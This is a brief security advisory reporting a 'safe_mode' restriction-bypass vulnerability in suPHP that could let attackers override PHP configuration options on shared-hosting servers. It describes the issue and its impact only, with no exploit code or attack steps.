suPHP is prone to a 'safe_mode' restriction-bypass vulnerability.

Successful exploits may allow attackers to bypass arbitrary PHP configuration options, including the 'safe_mode' setting.

This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code, with the 'safe_mode' restrictions assumed to isolate the users from each other.
